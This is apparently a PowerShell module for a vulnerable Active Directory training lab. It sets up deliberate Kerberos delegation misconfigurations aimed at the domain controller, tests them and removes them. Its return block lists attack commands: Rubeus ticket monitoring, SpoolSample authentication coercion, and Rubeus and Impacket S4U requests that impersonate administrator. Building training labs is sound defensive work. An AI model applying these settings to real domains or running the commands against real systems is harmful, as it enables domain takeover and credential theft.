#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys, removes, and tests Kerberos delegation attack scenarios in a vulnerable Active Directory lab.

.DESCRIPTION
    This module creates objects configured with various Kerberos delegation types that are
    vulnerable to abuse (MITRE ATT&CK T1550.003):

    - Unconstrained Delegation: A computer trusted for delegation to any service, allowing
      credential theft of any user who authenticates to it.
    - Constrained Delegation: A service account allowed to delegate to specific services on
      the DC, enabling impersonation attacks.
    - Constrained Delegation with Protocol Transition: Same as constrained but allows the
      service to impersonate users without them authenticating first (S4U2Self + S4U2Proxy).

.NOTES
    Module:     VulnAD - Delegation
    Author:     VulnAD Project
    Requires:   ActiveDirectory module, VulnAD-Core.ps1 helpers
    MITRE ID:   T1550.003
#>

function Deploy-Delegation {
    <#
    .SYNOPSIS
        Deploys Kerberos delegation attack scenarios.

    .DESCRIPTION
        Creates a computer object with unconstrained delegation, and two service accounts
        with constrained delegation (with and without protocol transition). All delegation
        targets are directed at the domain controller to demonstrate privilege escalation.

    .PARAMETER Difficulty
        Attack difficulty level: Easy, Medium, or Hard.

    .PARAMETER DomainDN
        Distinguished name of the domain (e.g., DC=contoso,DC=com).

    .PARAMETER Domain
        FQDN of the domain (e.g., contoso.com).

    .EXAMPLE
        Deploy-Delegation -Difficulty Medium -DomainDN 'DC=vulnlab,DC=local' -Domain 'vulnlab.local'
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory)]
        [string]$DomainDN,

        [Parameter(Mandatory)]
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying Delegation scenario ($Difficulty difficulty)" -Type Info

    $createdObjects = [System.Collections.Generic.List[string]]::new()

    # Resolve the DC hostname for delegation targets
    try {
        $dc = Get-ADDomainController -Discover -DomainName $Domain -ErrorAction Stop
        $dcHostname = $dc.HostName[0]
        Write-VulnStatus -Message "Resolved DC hostname: $dcHostname" -Type Info
    }
    catch {
        # Fallback: construct hostname from domain
        $dcHostname = "DC01.$Domain"
        Write-VulnStatus -Message "Could not discover DC, using fallback: $dcHostname" -Type Warning
    }

    # ── Scenario 1: Unconstrained Delegation (Computer) ──────────────────────
    $serversOU = "OU=Servers,OU=ADMonolith,$DomainDN"

    try {
        # Ensure the Servers OU exists
        try {
            Get-ADOrganizationalUnit -Identity $serversOU -ErrorAction Stop | Out-Null
        }
        catch {
            New-ADOrganizationalUnit -Name 'Servers' -Path "OU=ADMonolith,$DomainDN" -ProtectedFromAccidentalDeletion $false
            Write-VulnStatus -Message 'Created OU=Servers,OU=ADMonolith' -Type Info
        }

        # Create the computer object
        New-ADComputer -Name 'WEB01' `
                       -SamAccountName 'WEB01$' `
                       -Path $serversOU `
                       -Enabled $true `
                       -Description 'Web server - Unconstrained delegation target' `
                       -ErrorAction Stop

        # Enable unconstrained delegation
        $webComputer = Get-ADComputer -Identity 'WEB01' -ErrorAction Stop
        Set-ADComputer -Identity $webComputer -TrustedForDelegation $true
        $createdObjects.Add("Computer: WEB01$ (Unconstrained Delegation)")

        Write-VulnResult -Name 'WEB01$' -Detail 'Created with Unconstrained Delegation enabled' -Success $true
    }
    catch {
        Write-VulnResult -Name 'WEB01$' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error creating WEB01$: $($_.Exception.Message)" -Type Error
    }

    # ── Scenario 2: Constrained Delegation (Service Account) ─────────────────
    try {
        $password = Get-VulnPassword -Difficulty $Difficulty -Index 5

        $svcHttp = New-VulnUser -SamAccountName 'svc_http' `
                                -Name 'HTTP Service Account' `
                                -Password $password `
                                -DomainDN $DomainDN `
                                -Description 'IIS service identity - Constrained delegation to DC' `
                                -ServiceAccount

        if ($svcHttp) {
            # Configure constrained delegation to DC services
            $delegationTargets = @("CIFS/$dcHostname", "HTTP/$dcHostname")
            Set-ADUser -Identity 'svc_http' -Add @{
                'msDS-AllowedToDelegateTo' = $delegationTargets
            }

            # Set SPN for the service account
            Set-ADUser -Identity 'svc_http' -ServicePrincipalNames @{
                Add = "HTTP/web01.$Domain"
            }

            $createdObjects.Add("User: svc_http (Constrained Delegation -> $($delegationTargets -join ', '))")
            Write-VulnResult -Name 'svc_http' -Detail "Constrained delegation to: $($delegationTargets -join ', ')" -Success $true
        }
    }
    catch {
        Write-VulnResult -Name 'svc_http' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error creating svc_http: $($_.Exception.Message)" -Type Error
    }

    # ── Scenario 3: Constrained Delegation with Protocol Transition ──────────
    try {
        $password = Get-VulnPassword -Difficulty $Difficulty -Index 6

        $svcTransfer = New-VulnUser -SamAccountName 'svc_transfer' `
                                    -Name 'File Transfer Service Account' `
                                    -Password $password `
                                    -DomainDN $DomainDN `
                                    -Description 'Transfer service - Constrained delegation with protocol transition' `
                                    -ServiceAccount

        if ($svcTransfer) {
            # Configure constrained delegation with protocol transition
            $ldapTarget = @("LDAP/$dcHostname")
            Set-ADUser -Identity 'svc_transfer' -Add @{
                'msDS-AllowedToDelegateTo' = $ldapTarget
            }

            # Enable protocol transition (TrustedToAuthForDelegation = S4U2Self)
            Set-ADAccountControl -Identity 'svc_transfer' -TrustedToAuthForDelegation $true

            $createdObjects.Add("User: svc_transfer (Protocol Transition -> LDAP/$dcHostname)")
            Write-VulnResult -Name 'svc_transfer' -Detail "Protocol transition delegation to: LDAP/$dcHostname" -Success $true
        }
    }
    catch {
        Write-VulnResult -Name 'svc_transfer' -Detail "Failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error creating svc_transfer: $($_.Exception.Message)" -Type Error
    }

    # Summary
    Write-VulnResult -Name 'Delegation' -Detail "Deployed $($createdObjects.Count) delegation scenarios" -Success ($createdObjects.Count -gt 0) -IsLast

    return @{
        Scenario       = 'Kerberos Delegation Abuse'
        Description    = @(
            'This scenario deploys three types of Kerberos delegation misconfigurations:',
            '(1) Unconstrained delegation on WEB01$ allows credential interception of any',
            'authenticating user. (2) Constrained delegation on svc_http permits impersonation',
            'to CIFS/HTTP on the DC via S4U2Proxy. (3) Protocol transition on svc_transfer',
            'enables S4U2Self + S4U2Proxy to impersonate any user to LDAP on the DC without',
            'requiring the victim to authenticate first.'
        ) -join ' '
        CreatedObjects = $createdObjects.ToArray()
        AttackCommands = @(
            "# ── Enumeration ──",
            "# Find delegation configurations with Impacket",
            "impacket-findDelegation $Domain/<username>:<password> -dc-ip <DC_IP>",
            "",
            "# PowerView - Enumerate delegation",
            "Get-DomainComputer -Unconstrained | Select-Object dnshostname, samaccountname",
            "Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto",
            "",
            "# ── Unconstrained Delegation (WEB01$) ──",
            "# Monitor for incoming TGTs on compromised WEB01",
            "Rubeus.exe monitor /interval:5 /nowrap",
            "",
            "# Coerce authentication from DC to WEB01 (e.g., PrinterBug / PetitPotam)",
            "SpoolSample.exe $dcHostname WEB01.$Domain",
            "",
            "# ── Constrained Delegation (svc_http) ──",
            "# S4U2Proxy: request service ticket as admin to DC",
            "Rubeus.exe s4u /user:svc_http /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/$dcHostname /ptt",
            "impacket-getST $Domain/svc_http:<password> -spn CIFS/$dcHostname -impersonate administrator -dc-ip <DC_IP>",
            "",
            "# ── Protocol Transition (svc_transfer) ──",
            "# S4U2Self + S4U2Proxy: full impersonation without victim interaction",
            "Rubeus.exe s4u /user:svc_transfer /rc4:<hash> /impersonateuser:administrator /msdsspn:LDAP/$dcHostname /ptt",
            "impacket-getST $Domain/svc_transfer:<password> -spn LDAP/$dcHostname -impersonate administrator -dc-ip <DC_IP>"
        )
        AttackPath     = @(
            "Unconstrained:  Coerce DC auth -> WEB01$ captures TGT -> Pass-the-Ticket -> DA",
            "Constrained:    svc_http creds -> S4U2Proxy -> CIFS/HTTP ticket as admin on DC",
            "Proto Trans:    svc_transfer creds -> S4U2Self+S4U2Proxy -> LDAP as admin on DC"
        ) -join "`n"
        MitreID        = 'T1550.003'
        Difficulty     = $Difficulty
    }
}

function Remove-Delegation {
    <#
    .SYNOPSIS
        Removes all Delegation scenario objects from Active Directory.

    .DESCRIPTION
        Deletes the computer object WEB01$ and service accounts svc_http, svc_transfer.
    #>
    [CmdletBinding()]
    param()

    Write-VulnStatus -Message 'Removing Delegation scenario objects' -Type Info

    # Remove computer object
    try {
        $computer = Get-ADComputer -Identity 'WEB01' -ErrorAction Stop
        Remove-ADComputer -Identity $computer -Confirm:$false
        Write-VulnResult -Name 'WEB01$' -Detail 'Computer removed' -Success $true
    }
    catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
        Write-VulnResult -Name 'WEB01$' -Detail 'Not found (already removed)' -Success $true
    }
    catch {
        Write-VulnResult -Name 'WEB01$' -Detail "Removal failed: $($_.Exception.Message)" -Success $false
        Write-VulnStatus -Message "Error removing WEB01$: $($_.Exception.Message)" -Type Error
    }

    # Remove service accounts
    $accounts = @('svc_http', 'svc_transfer')
    foreach ($account in $accounts) {
        try {
            $adUser = Get-ADUser -Identity $account -ErrorAction Stop
            Remove-ADUser -Identity $adUser -Confirm:$false
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Removed successfully' -Success $true -IsLast:$isLast
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail 'Not found (already removed)' -Success $true -IsLast:$isLast
        }
        catch {
            $isLast = ($account -eq $accounts[-1])
            Write-VulnResult -Name $account -Detail "Removal failed: $($_.Exception.Message)" -Success $false -IsLast:$isLast
        }
    }
}

function Test-Delegation {
    <#
    .SYNOPSIS
        Validates that the Delegation scenario is correctly deployed.

    .DESCRIPTION
        Checks that WEB01$ has unconstrained delegation, svc_http has constrained delegation,
        and svc_transfer has protocol transition configured.

    .PARAMETER Domain
        FQDN of the domain for constructing expected delegation targets.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Domain
    )

    Write-VulnStatus -Message 'Testing Delegation scenario deployment' -Type Info

    $allPassed = $true

    # Test 1: WEB01$ - Unconstrained Delegation
    try {
        $computer = Get-ADComputer -Identity 'WEB01' -Properties TrustedForDelegation -ErrorAction Stop
        if ($computer.TrustedForDelegation -eq $true) {
            Write-VulnResult -Name 'WEB01$' -Detail 'Unconstrained delegation is ENABLED' -Success $true
        }
        else {
            Write-VulnResult -Name 'WEB01$' -Detail 'Unconstrained delegation is DISABLED' -Success $false
            $allPassed = $false
        }
    }
    catch {
        Write-VulnResult -Name 'WEB01$' -Detail "Check failed: $($_.Exception.Message)" -Success $false
        $allPassed = $false
    }

    # Test 2: svc_http - Constrained Delegation
    try {
        $svcHttp = Get-ADUser -Identity 'svc_http' -Properties 'msDS-AllowedToDelegateTo' -ErrorAction Stop
        $delegateTo = $svcHttp.'msDS-AllowedToDelegateTo'
        if ($delegateTo -and $delegateTo.Count -ge 1) {
            Write-VulnResult -Name 'svc_http' -Detail "Constrained delegation to: $($delegateTo -join ', ')" -Success $true
        }
        else {
            Write-VulnResult -Name 'svc_http' -Detail 'No constrained delegation targets found' -Success $false
            $allPassed = $false
        }
    }
    catch {
        Write-VulnResult -Name 'svc_http' -Detail "Check failed: $($_.Exception.Message)" -Success $false
        $allPassed = $false
    }

    # Test 3: svc_transfer - Protocol Transition
    try {
        $svcTransfer = Get-ADUser -Identity 'svc_transfer' -Properties 'msDS-AllowedToDelegateTo', TrustedToAuthForDelegation -ErrorAction Stop
        $hasTransition = $svcTransfer.TrustedToAuthForDelegation -eq $true
        $hasDelegation = $svcTransfer.'msDS-AllowedToDelegateTo' -and $svcTransfer.'msDS-AllowedToDelegateTo'.Count -ge 1

        if ($hasTransition -and $hasDelegation) {
            Write-VulnResult -Name 'svc_transfer' -Detail 'Protocol transition and constrained delegation configured' -Success $true
        }
        else {
            $detail = @()
            if (-not $hasTransition) { $detail += 'TrustedToAuthForDelegation=False' }
            if (-not $hasDelegation) { $detail += 'No delegation targets' }
            Write-VulnResult -Name 'svc_transfer' -Detail "Incomplete: $($detail -join '; ')" -Success $false
            $allPassed = $false
        }
    }
    catch {
        Write-VulnResult -Name 'svc_transfer' -Detail "Check failed: $($_.Exception.Message)" -Success $false
        $allPassed = $false
    }

    Write-VulnResult -Name 'Delegation' `
                     -Detail $(if ($allPassed) { 'All checks passed' } else { 'Some checks FAILED' }) `
                     -Success $allPassed -IsLast

    return $allPassed
}

Export-ModuleMember -Function Deploy-Delegation, Remove-Delegation, Test-Delegation

